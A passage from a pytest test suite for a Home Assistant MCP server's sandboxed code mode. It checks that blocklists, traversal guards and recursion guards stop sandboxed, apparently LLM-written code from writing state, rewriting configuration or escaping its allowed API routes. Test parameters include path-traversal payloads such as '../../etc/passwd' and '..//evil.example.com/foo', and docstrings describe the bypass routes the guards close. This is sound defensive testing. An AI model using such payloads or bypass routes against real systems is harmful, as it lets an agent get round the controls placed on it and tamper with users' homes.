        the nesting a saved tool literally named ``result`` would
        shadow ``data.result`` for the run_saved branch.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "List saved tools")

        # Save a tool first
        save_data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "'listed'",
                "justification": "E2E test: list saved tools",
                "save_as": "e2e_listed",
            },
        )
        assert save_data.get("success") is True, f"Save should succeed: {save_data}"

        # List
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"list_saved": True},
        )
        assert data.get("success") is True, f"Should succeed: {data}"
        outer = data.get("data", {})
        assert "saved_tools" in outer, (
            f"Response should nest under data.saved_tools: {data}"
        )
        assert "count" in outer, f"Response should include data.count: {data}"
        tools = outer["saved_tools"]
        assert "e2e_listed" in tools, f"Should contain saved tool: {data}"
        assert tools["e2e_listed"]["code"] == "'listed'", f"Code should match: {data}"
        assert outer["count"] == len(tools), (
            f"Count must equal saved_tools length: {data}"
        )
        logger.info("List saved tools returns correct shape (data.saved_tools[name])")

    async def test_run_nonexistent_saved_tool(self, mcp_client_with_code_mode):
        """Running a nonexistent saved tool returns error."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Run nonexistent saved tool")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"run_saved": "nonexistent_e2e_tool_12345"},
        )
        assert data.get("success") is False, f"Nonexistent tool should fail: {data}"
        logger.info("Correctly rejected nonexistent saved tool")

    async def test_delete_saved_tool_via_sandbox(self, mcp_client_with_code_mode):
        """Sandbox code can delete a saved tool with delete_saved_tool(name)."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Delete saved tool from sandbox")

        # Step 1: save a tool we'll then delete.
        save = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "1 + 1",
                "justification": "E2E test: setup for delete",
                "save_as": "e2e_tool_to_delete",
            },
        )
        assert save.get("success") is True, f"Save should succeed: {save}"

        # Step 2: delete it from inside the sandbox.
        delete = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": 'delete_saved_tool("e2e_tool_to_delete")',
                "justification": "E2E test: delete saved tool",
            },
        )
        assert delete.get("success") is True, (
            f"Delete sandbox call should succeed: {delete}"
        )
        result = delete["data"]["result"]
        assert isinstance(result, dict), f"Expected dict result: {result}"
        assert result.get("deleted") is True, (
            f"delete_saved_tool should report deleted=True: {result}"
        )
        assert result.get("name") == "e2e_tool_to_delete", (
            f"delete_saved_tool should echo the name: {result}"
        )

        # Step 3: confirm running it now fails (entry is gone).
        run_again = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"run_saved": "e2e_tool_to_delete"},
        )
        assert run_again.get("success") is False, (
            f"Running deleted tool should fail: {run_again}"
        )
        logger.info("Sandbox-driven delete_saved_tool round-trip verified")

    async def test_delete_saved_tool_nonexistent(self, mcp_client_with_code_mode):
        """delete_saved_tool returns an error dict for unknown names."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Delete nonexistent saved tool")

        code = (
            'result = delete_saved_tool("e2e_no_such_tool_xyz")\n'
            '{"has_error": "error" in result, "error": result.get("error", "")}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: delete nonexistent"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"delete_saved_tool should error on missing name: {data}"
        )
        logger.info("delete_saved_tool correctly errored on missing name")

    async def test_delete_saved_tool_invalid_name(self, mcp_client_with_code_mode):
        """delete_saved_tool rejects names that don't match the validation regex."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Delete saved tool with invalid name")

        code = (
            'result = delete_saved_tool("../bad-name!")\n'
            '{"has_error": "error" in result, "error": result.get("error", "")}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: invalid name in delete"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"delete_saved_tool should reject invalid names: {data}"
        )
        assert "invalid" in result["error"].lower(), (
            f"Error should mention invalidity: {result}"
        )
        logger.info("delete_saved_tool correctly rejected invalid name")


# ---------------------------------------------------------------------------
# api_post path blocklist (#1, #2, #4 from PR #854 stress-test findings)
# ---------------------------------------------------------------------------


class TestCodeModeApiPostBlocklist:
    """Verify _api_post rejects writes to endpoints that bypass wrapping-tool
    validation or that have no legitimate sandbox use case.
    """

    async def test_api_post_blocks_state_write(self, mcp_client_with_code_mode):
        """POST /api/states/<entity_id> is blocked — it can conjure ghost
        entities and override real ones in the state machine.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post states/* blocklist")

        code = (
            'result = await api_post("/states/sensor.fake_pwn_sensor",'
            ' {"state": "1337"})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked state write"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_post must block /api/states/* writes: {data}"
        )
        assert (
            "states" in result["error"].lower() or "blocked" in result["error"].lower()
        ), f"Error should explain the block: {result}"
        logger.info("api_post correctly blocked /api/states/* write")

    async def test_api_post_blocks_ha_internal_event(self, mcp_client_with_code_mode):
        """POST /api/events/state_changed is blocked — spoofing HA Core
        internal events can fan out into user automations.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post events HA-internal blocklist")

        code = (
            'result = await api_post("/events/state_changed",'
            ' {"entity_id": "sensor.x", "new_state": {}})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked HA-internal event"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_post must block HA-internal events: {data}"
        )
        assert (
            "state_changed" in result["error"] or "internal" in result["error"].lower()
        ), f"Error should mention the blocked event: {result}"
        logger.info("api_post correctly blocked /api/events/state_changed")

    async def test_api_post_allows_custom_event(self, mcp_client_with_code_mode):
        """POST /api/events/<custom_event> is allowed — only HA Core
        internal event names are blocked, not user-defined types.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post custom event allowed")

        # The endpoint exists in HA REST and accepts arbitrary payloads,
        # so we just verify the sandbox didn't reject it preemptively.
        code = (
            'result = await api_post("/events/my_app_completed", {"foo": "bar"})\n'
            '{"has_error": "error" in result if isinstance(result, dict)'
            " else False,"
            ' "error": result.get("error", "") if isinstance(result, dict)'
            ' else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: custom event allowed"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        # The HA endpoint may return an "error" field for legitimate reasons
        # (e.g. RBAC), but our sandbox-side blocklist must not be the cause.
        if result["has_error"]:
            err = result["error"].lower()
            assert "blocked" not in err and "internal" not in err, (
                f"Custom event must not be sandbox-blocked: {result}"
            )
        logger.info("api_post correctly allowed custom event type")

    async def test_api_post_blocks_automation_config_write(
        self, mcp_client_with_code_mode
    ):
        """POST /api/config/automation/config/* is blocked — bypasses the
        validation in ha_config_set_automation.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post automation config blocklist")

        code = (
            'result = await api_post("/config/automation/config/abcd1234",'
            ' {"alias": "X", "trigger": [], "action": []})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked automation config"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_post must block automation/config/*: {data}"
        )
        assert "ha_config_set_automation" in result["error"], (
            f"Error should point at the wrapping tool: {result}"
        )
        logger.info("api_post correctly blocked automation config write")

    async def test_api_post_blocks_script_config_write(self, mcp_client_with_code_mode):
        """POST /api/config/script/config/* is blocked for the same reason
        as automation: bypasses ``ha_config_set_script`` validation.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post script blocklist")

        code = (
            'result = await api_post("/config/script/config/abcd1234",'
            ' {"name": "X"})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked script config"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_post must block script/config/*: {data}"
        )
        assert "ha_config_set_script" in result["error"], (
            f"Error should point at the wrapping tool: {result}"
        )
        logger.info("api_post correctly blocked script config write")

    async def test_api_post_blocks_scene_config_write(self, mcp_client_with_code_mode):
        """POST /api/config/scene/config/* is blocked for the same reason
        as automation/script: bypasses ``ha_config_set_scene`` validation
        (entities-must-be-dict shape check, reference validation,
        hash-locking).
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post scene blocklist")

        code = (
            'result = await api_post("/config/scene/config/abcd1234",'
            ' {"name": "X"})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked scene config"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_post must block scene/config/*: {data}"
        )
        assert "ha_config_set_scene" in result["error"], (
            f"Error should point at the wrapping tool: {result}"
        )
        logger.info("api_post correctly blocked scene config write")

    async def test_api_post_blocks_scene_config_delete(self, mcp_client_with_code_mode):
        """The path-prefix blocklist catches every operation under
        ``/api/config/scene/config/`` regardless of payload shape.

        Sandbox exposes only ``api_post``/``api_get`` — there is no
        ``api_delete`` — so an LLM trying to bypass ``ha_config_remove_scene``
        must funnel through ``api_post``. This test exercises the
        delete-flavored attack pattern (empty/null body to trigger the
        REST API's DELETE-on-empty-POST behaviour) and asserts the
        path-prefix check still rejects it. Companion to
        ``test_api_post_blocks_scene_config_write`` — both paths converge
        on the same prefix and must reject identically.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "api_post scene blocklist (delete-shaped)")

        code = (
            # Empty body — the closest a sandboxed caller can get to a
            # DELETE shape. Whatever the payload, the prefix check fires
            # before the request is made.
            'result = await api_post("/config/scene/config/scene_to_delete", None)\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked scene config delete"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"api_post must block scene/config/* irrespective of payload: {data}"
        )
        assert "ha_config_set_scene" in result["error"], (
            f"Error should point at the wrapping tool: {result}"
        )
        logger.info("api_post correctly blocked scene config delete-shape")


# ---------------------------------------------------------------------------
# ws_send command blocklist (#3, #5 from PR #854 stress-test findings)
# ---------------------------------------------------------------------------


class TestCodeModeWsSendBlocklist:
    """Verify _ws_send rejects WebSocket commands that rewrite persistent
    state or bypass wrapping-tool validation.
    """

    async def test_ws_send_blocks_core_config_update(self, mcp_client_with_code_mode):
        """config/core/update is blocked — it persistently rewrites the HA
        installation's location/timezone/currency/lat-long.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "ws_send config/core/update blocklist")

        code = (
            'result = await ws_send({"type": "config/core/update",'
            ' "location_name": "PWN_LAB"})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked core config update"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"ws_send must block config/core/update: {data}"
        )
        assert "config/core/update" in result["error"], (
            f"Error should mention the blocked command: {result}"
        )
        logger.info("ws_send correctly blocked config/core/update")

    async def test_ws_send_blocks_lovelace_config_save(self, mcp_client_with_code_mode):
        """lovelace/config/save is blocked — bypasses ha_config_set_dashboard
        which performs the storage-mode collision check.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "ws_send lovelace/config/save blocklist")

        code = (
            'result = await ws_send({"type": "lovelace/config/save",'
            ' "url_path": "lovelace", "config": {}})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: blocked lovelace save"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, (
            f"ws_send must block lovelace/config/save: {data}"
        )
        assert "lovelace/config/save" in result["error"], (
            f"Error should mention the blocked command: {result}"
        )
        logger.info("ws_send correctly blocked lovelace/config/save")

    @pytest.mark.parametrize(
        "ws_type",
        [
            # Each member of _BLOCKED_WS_COMMANDS must be rejected by
            # ws_send. Listed explicitly so a regression that drops an
            # entry from the frozenset surfaces as a missing parametrize
            # row in CI rather than passing silently.
            "config/core/update",
            "lovelace/config/save",
            "lovelace/dashboards/create",
            "lovelace/dashboards/delete",
            "lovelace/dashboards/update",
            "config/area_registry/delete",
            "config/area_registry/disable",
            "config/area_registry/update",
            "config/device_registry/delete",
            "config/device_registry/disable",
            "config/device_registry/update",
            "config/device_registry/remove_config_entry",
            "config/entity_registry/delete",
            "config/entity_registry/disable",
            "config/entity_registry/update",
            "config/entity_registry/remove",
            "config/floor_registry/create",
            "config/floor_registry/delete",
            "config/floor_registry/update",
            "config/label_registry/create",
            "config/label_registry/delete",
            "config/label_registry/update",
            "config/category_registry/create",
            "config/category_registry/delete",
            "config/category_registry/update",
        ],
    )
    async def test_ws_send_blocks_command(self, mcp_client_with_code_mode, ws_type):
        """Every entry in _BLOCKED_WS_COMMANDS must be rejected by ws_send.

        Parametrizing over the full set catches the "blocklist names a
        command HA Core doesn't actually accept" class of bug — if a
        future refactor drops an entry, the corresponding row fails;
        if HA Core renames a command and we forget to update the
        blocklist, the test fails with the old name still in the
        parametrize list.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, f"ws_send blocks {ws_type}")

        code = (
            f'result = await ws_send({{"type": "{ws_type}", "id": "x"}})\n'
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": f"E2E test: blocked {ws_type}"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, f"ws_send must block {ws_type}: {data}"
        assert ws_type in result["error"], (
            f"Error should mention the blocked command: {result}"
        )
        logger.info("ws_send correctly blocked %s", ws_type)

    async def test_ws_send_allows_registry_list(self, mcp_client_with_code_mode):
        """Registry LIST queries stay allowed — only mutations are blocked."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "ws_send registry list allowed")

        code = (
            'result = await ws_send({"type": "config/area_registry/list"})\n'
            '{"is_dict": isinstance(result, dict),'
            ' "has_blocked_error": isinstance(result, dict) and "blocked" in'
            ' str(result.get("error", "")).lower()}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: registry list allowed"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_blocked_error"] is False, (
            f"area_registry/list must not be sandbox-blocked: {data}"
        )
        logger.info("ws_send correctly allowed area_registry/list")


# ---------------------------------------------------------------------------
# Sandbox error classification (#4 mitigation)
# ---------------------------------------------------------------------------


class TestCodeModeErrorClassification:
    """Verify Monty runtime failures map to the right SANDBOX_* error code
    with targeted suggestions, not the previous generic INTERNAL_ERROR.
    """

    async def test_import_returns_syntax_unsupported(self, mcp_client_with_code_mode):
        """An ``import`` statement maps to SANDBOX_SYNTAX_UNSUPPORTED with a
        suggestion that names the injected helpers, not 'check the syntax'.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Error classification: imports")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "import time\ntime.time()",
                "justification": "E2E test: import classification",
            },
        )
        assert data.get("success") is False, f"Should fail: {data}"
        err = data.get("error", {})
        err_code = err.get("code") if isinstance(err, dict) else ""
        err_message = str(err.get("message", "")) if isinstance(err, dict) else str(err)
        err_suggestions = err.get("suggestions", []) if isinstance(err, dict) else []
        assert err_code == "SANDBOX_SYNTAX_UNSUPPORTED", (
            f"Expected SANDBOX_SYNTAX_UNSUPPORTED, got {err_code}: {data}"
        )
        joined = " ".join(str(s) for s in err_suggestions).lower()
        assert "import" in joined or "helper" in joined, (
            f"Suggestions should reference imports/helpers, got: {err_suggestions}"
        )
        logger.info("Import classification correct: %s", err_message[:120])

    async def test_class_returns_syntax_unsupported(self, mcp_client_with_code_mode):
        """``class`` definitions are unsupported by Monty; should map to
        SANDBOX_SYNTAX_UNSUPPORTED.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Error classification: class")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "class Foo:\n    pass\nFoo()",
                "justification": "E2E test: class classification",
            },
        )
        assert data.get("success") is False, f"Should fail: {data}"
        err = data.get("error", {})
        err_code = err.get("code") if isinstance(err, dict) else ""
        assert err_code == "SANDBOX_SYNTAX_UNSUPPORTED", (
            f"Expected SANDBOX_SYNTAX_UNSUPPORTED, got {err_code}: {data}"
        )
        logger.info("Class classification correct")

    async def test_syntax_error_returns_syntax_unsupported(
        self, mcp_client_with_code_mode
    ):
        """A bare syntax error also maps to SANDBOX_SYNTAX_UNSUPPORTED."""
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Error classification: syntax")

        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "def foo(:\n  pass",
                "justification": "E2E test: syntax classification",
            },
        )
        assert data.get("success") is False, f"Should fail: {data}"
        err = data.get("error", {})
        err_code = err.get("code") if isinstance(err, dict) else ""
        assert err_code == "SANDBOX_SYNTAX_UNSUPPORTED", (
            f"Expected SANDBOX_SYNTAX_UNSUPPORTED, got {err_code}: {data}"
        )
        logger.info("Syntax error classification correct")


# ---------------------------------------------------------------------------
# Patch76 review fixes — additional resource-limit, traversal, and
# proxy-laundering coverage
# ---------------------------------------------------------------------------


class TestCodeModeAdditionalResourceLimits:
    """``TestCodeModeResourceLimits`` only covers timeout. These pin the
    other three sandbox limits (memory, recursion, invocation cap) so a
    regression that severs the wiring on any one of them surfaces in CI.
    """

    async def test_memory_limit_enforced(self, mcp_client_with_code_mode):
        """Allocating more than ``CODE_MODE_MAX_MEMORY`` must raise
        ``SANDBOX_LIMIT_EXCEEDED``, not silently succeed.

        Uses string multiplication rather than ``bytearray`` because
        Monty's sandbox doesn't expose ``bytearray`` as a builtin
        (``LookupError: Unable to find 'bytearray' in external functions
        dict``); ``str * int`` is a pure operator with no builtin
        lookup.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Memory limit enforcement")

        # Default limit is 10 MB; allocating ~12 MB must trip it.
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {
                "code": "x = 'x' * (12 * 1024 * 1024)\nlen(x)",
                "justification": "E2E test: memory limit enforcement",
            },
        )
        assert data.get("success") is False, f"Should fail: {data}"
        err = data.get("error", {})
        err_code = err.get("code") if isinstance(err, dict) else ""
        assert err_code == "SANDBOX_LIMIT_EXCEEDED", (
            f"Expected SANDBOX_LIMIT_EXCEEDED, got {err_code}: {data}"
        )
        logger.info("Memory limit correctly classified")

    async def test_recursion_limit_unreachable_from_user_code(
        self, mcp_client_with_code_mode
    ):
        """Document that ``CODE_MODE_MAX_RECURSION`` is not directly
        exercisable from sandbox-supplied code.

        Monty doesn't allow ``def`` (`SANDBOX_SYNTAX_UNSUPPORTED` —
        see ``test_no_class_definitions``-adjacent coverage), and an
        assigned lambda can't reference its own binding name from
        inside its own body (``LookupError: Unable to find 'f' in
        external functions dict``). User code therefore has no way to
        construct a recursive call deep enough to trip the
        ``ResourceLimits.max_recursion_depth`` cap.

        The setting still flows through to the sandbox runtime — see
        ``_run_sandboxed_code``, where ``ResourceLimits(...,
        max_recursion_depth=settings.code_mode_max_recursion)`` is
        constructed — and the classifier maps a ``RecursionError`` to
        ``SANDBOX_LIMIT_EXCEEDED`` (covered by the unit-level
        ``test_classify_recursion_error`` in
        ``tests/src/unit/test_saved_tools_persistence.py``-adjacent
        suite).

        The function body is intentionally empty: keeping the name +
        docstring preserves the architectural-gap documentation for
        future maintainers without contributing a skipped test to CI
        (per #1349 close-out).
        """

    async def test_invocation_cap_enforced(self, mcp_client_with_code_mode):
        """Looping past ``code_mode_max_invocations`` must trip the cap
        and surface the cap error to sandbox code (not raise into the
        tool wrapper).
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "Invocation cap enforcement")

        # Default cap is 100. Loop 110 api_get calls and expect at
        # least one to hit the cap.
        code = (
            "errors = 0\n"
            "i = 0\n"
            "while i < 110:\n"
            "    r = await api_get('/config')\n"
            "    if isinstance(r, dict) and 'error' in r and "
            "'limit exceeded' in str(r.get('error', '')).lower():\n"
            "        errors += 1\n"
            "    i = i + 1\n"
            "{'errors': errors}"
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": "E2E test: invocation cap"},
        )
        # The sandbox itself should still return success — the cap is
        # surfaced as ``{"error": ...}`` to user code, not as a tool
        # error.
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["errors"] > 0, (
            f"Cap must fire at least once during a 110-call loop: {data}"
        )
        logger.info("Invocation cap correctly fires (%d cap hits)", result["errors"])


class TestCodeModeNormalizeEndpointTraversal:
    """``..`` segments in ``api_get`` / ``api_post`` endpoints must be
    rejected before httpx resolves the URL. Without this, the sandbox
    can escape ``/api/`` to bearer-authenticated routes elsewhere on
    the HA instance (``/auth/...``, ``/profile``, etc.).
    """

    @pytest.mark.parametrize(
        "endpoint",
        [
            "../auth/providers",  # single ..
            "../../etc/passwd",  # double .. (path-traversal classic)
            "..//evil.example.com/foo",  # ..// reverse-proxy edge case
            "foo/../bar",  # mid-path ..
            # Percent-encoded traversal — pins the M2 fix's
            # ``urllib.parse.unquote(segment)`` call. Without that
            # call the segment loop sees ``%2e%2e`` as a normal
            # filename and would let it slip past on reverse-proxy
            # setups that decode-then-resolve.
            "%2e%2e/auth/providers",  # lowercase percent-encoded
            "%2E%2E/auth/providers",  # uppercase percent-encoded
        ],
    )
    async def test_api_get_rejects_dot_dot_segment(
        self, mcp_client_with_code_mode, endpoint
    ):
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, f"api_get traversal {endpoint}")

        code = (
            f"result = await api_get({endpoint!r})\n"
            '{"has_error": "error" in result if isinstance(result, dict) else False,'
            ' "error": result.get("error", "") if isinstance(result, dict) else ""}'
        )
        data = await safe_call_tool(
            mcp_client_with_code_mode,
            TOOL_NAME,
            {"code": code, "justification": f"E2E test: traversal {endpoint}"},
        )
        assert data.get("success") is True, f"Sandbox should succeed: {data}"
        result = data["data"]["result"]
        assert result["has_error"] is True, f"api_get must reject {endpoint!r}: {data}"
        # Either the protocol-relative '//' guard fires (catches
        # '..//evil.example.com/foo') or the explicit '..' guard does;
        # both produce errors that mention the rejection cause.
        err = result["error"].lower()
        assert "blocked" in err or "absolute" in err or ".." in err, (
            f"Error should explain traversal rejection: {result}"
        )
        logger.info("api_get correctly rejected %r", endpoint)


class TestCodeModeProxyLaunderingBlocked:
    """The recursive-self-call guard at ``_BLOCKED_TOOLS`` must hold even
    when ``ENABLE_TOOL_SEARCH=true`` — i.e. a sandbox cannot launder a
    recursive ``ha_manage_custom_tool`` invocation through
    ``ha_call_write_tool``. Two layered fixes close this:

    1. ``CategorizedSearchTransform`` (with ``enable_code_mode=True``)
       excludes pinned tools from the proxy's category sets, so the
       proxy returns ``RESOURCE_NOT_FOUND`` for ``ha_manage_custom_tool``.
    2. The sandbox's ``_BLOCKED_TOOLS`` set includes the four search
       synthetics (``ha_search_tools``, ``ha_call_{read,write,delete}_tool``)
       so even if a future regression re-enabled the proxy dispatch, the
       in-sandbox guard would still refuse.

    These tests pin the second layer (which is always active when code
    mode is on, regardless of tool-search state). The first layer is
    tested by ``test_recursive_self_call_blocked_via_proxy`` which
    requires ``enable_tool_search=true`` and is therefore conditional.
    """

    async def test_call_tool_to_search_synthetic_blocked(
        self, mcp_client_with_code_mode
    ):
        """Sandbox cannot call ``ha_call_write_tool`` directly via
        ``call_tool`` — it's in ``_BLOCKED_TOOLS`` so any tool-search
        synthetic is unreachable from inside the sandbox.
        """
        check = await _check_tool_available(mcp_client_with_code_mode)
        _skip_if_unavailable(check, "call_tool synthetic block")

        for synthetic in (
            "ha_search_tools",
            "ha_call_read_tool",
            "ha_call_write_tool",
            "ha_call_delete_tool",
        ):
            code = (
                f"result = await call_tool({synthetic!r}, "
                '{"name": "ha_get_overview", "arguments": {}})\n'
                "result"
            )
            data = await safe_call_tool(
                mcp_client_with_code_mode,
                TOOL_NAME,
                {"code": code, "justification": f"E2E test: blocked {synthetic}"},
            )
            assert data.get("success") is True, f"Sandbox should succeed: {data}"
            result = data["data"]["result"]
            # _call_tool returns a structured _sandbox_error for blocked
            # tools, with success=False and error.code=AUTH_INSUFFICIENT_PERMISSIONS.
            assert isinstance(result, dict) and result.get("success") is False, (
                f"Synthetic {synthetic!r} must be blocked: {result}"
            )
            err = result.get("error", {})
            err_message = err.get("message", "") if isinstance(err, dict) else ""
            assert "cannot be called" in err_message, (
                f"Block message should explain rejection: {result}"
            )
            logger.info("call_tool to %r correctly blocked", synthetic)


class TestCodeModeSavePersistenceFailure:
    """Companion to the unit tests in ``test_saved_tools_persistence.py``
    — verifies the user-facing E2E shape of the save_warning rollback.
    Reaches the persistence-failure path by ``chmod``-ing the addon's
    ``/data/saved_tools.json`` unwriteable mid-test via the SSH-addon
    docker-exec helper.
    """

    @pytest.mark.inaddon_only
    async def test_save_warning_rollback_shape(self, mcp_client):
        """When persistence fails, the response must include
        ``save_warning`` and reset ``saved_as`` to None. The unit
        suite covers the helper behaviour; this E2E pins the shape
        returned to MCP clients against the real addon container.

        Mechanism: SSH into HAOS via the bake-installed Advanced SSH
        addon and ``docker exec`` ``chmod 444`` on the dev addon's
        ``/data/saved_tools.json``. The addon's persistence write then
        fails with EACCES, ``_save_saved_tools`` returns False, and the
        ``ha_manage_custom_tool`` response surfaces the rollback shape.
        Restoration via ``chmod 644`` runs in the test's ``finally``
        regardless of outcome.

        Uses the session-scoped ``mcp_client`` fixture (HTTP transport
        to the addon) rather than ``mcp_client_with_code_mode`` (an
        in-process server that wouldn't exercise the addon's on-disk
        ``/data/saved_tools.json``). The dev addon has code mode
        enabled at install time via ``build_image.install_ha_mcp_dev_addon``
        options, so ``ha_manage_custom_tool`` is exposed on the addon's
        MCP endpoint.
        """
        from haos_runtime import HA_MCP_DEV_ADDON_SLUG, docker_exec_in_addon

        # Precondition: the addon must expose ``ha_manage_custom_tool``.
        # On the inaddon tier this is the bake-time config, but assert
        # rather than silently no-op so a regression in the bake's
        # ENABLE_CODE_MODE wiring fails this test loudly.
        tools = await mcp_client.list_tools()
        tool_names = {t.name for t in tools}
        assert TOOL_NAME in tool_names, (
            f"{TOOL_NAME!r} not exposed by addon MCP endpoint — the dev "
            f"addon's ENABLE_CODE_MODE option must be enabled by "
            f"build_image.install_ha_mcp_dev_addon for this test. "
            f"Available tools: {sorted(tool_names)[:10]}..."
        )

        saved_tools_path = "/data/saved_tools.json"

        # ``chmod 444`` is a no-op against root inside the addon
        # container (root bypasses DAC mode bits via CAP_DAC_OVERRIDE),
        # so the save would succeed and the test would silently fail to
        # exercise the rollback path. Replace the file with a DIRECTORY
        # at the same name: ``open(path, "w")`` then raises
        # ``IsADirectoryError`` (errno=EISDIR) which root can't bypass.
        # This is the smallest cross-fs-compatible trick to make a path
        # truly unwriteable to any caller. Restore in ``finally`` by
        # removing the dir and re-creating an empty file at the path.
        docker_exec_in_addon(
